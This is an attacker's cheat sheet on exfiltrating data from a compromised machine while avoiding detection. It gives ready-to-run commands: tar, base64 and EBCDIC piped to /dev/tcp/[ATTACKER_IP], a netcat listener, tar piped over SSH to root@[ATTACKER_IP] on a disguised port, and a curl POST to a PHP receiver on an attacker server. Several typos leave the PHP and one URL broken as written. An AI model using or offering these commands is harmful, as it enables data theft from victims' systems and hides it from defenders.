Data Exfiltration.
------------------

Data exfiltration techniques with tips for not being detected.

1. Exilfration over TCP Socket with ExtendedBinaryCodedDecimalInterchangeCode and Base64.
-----------------------------------------------------------------------------------------

On compromised machine: data compression (tar), data encoding (base64 and EBCDIC), data sent to attacker over TCP.
On attacker machine: TCP listener, data decompression (tar), data deconding.

1a) nc -lvnp 80 > datafolder.tmp
2c) tar zfc - /tmp/[FOLDER_W/DATA_TO_EXFIL] | base64 | dd conv=ebcdic > /dev/tcp/[ATTACKER_IP]/80
3a) dd conv=ascii if=datafolder.tmp | base64 -d > datafolder.tar
4a) tar xf datafolder.tar


2. Exfiltration over SSH.
-------------------------

Data travels encrypted. "Tared" on compromised machine and "untared" on attacker machine.

1c) tar zfc - /tmp/[FOLDER_W/DATA_TO_EXIL] | ssh root@[ATTACKER_IP] "cd /tmp; tar zxpd -"

Tip: use different port for SSH, like 80


3. Exfiltration via POST Request over HTTPS.
--------------------------------------------

Exfiltration using POST Requests via HTTPS/SSL to PHP-based server/listener on attacker machine. SSL certificate required.

1a) <?php file_put_contets('/tmp/datafolder.base64', file_get_contests('php://input')); ?>
# Creation of a PHP file that writes data being received as a POST request to a file called /tmp(datafolder.base64
2c) curl --data "$(tar zcf - /tmp/datafolder | base64)" https://[ATTACKER_SERVER/contact.php
# Sending of a POST request consisting in a "tared" and base64-encoded data over HTTPS to the attacker php web server
3a) cat /tmp/datafolder.base64 | base64 -d > datafolder.tar && tar xf datafolder.tar
# Send base64 econded output to base64 for decoding, then the output is piped into tar for decompression.
 
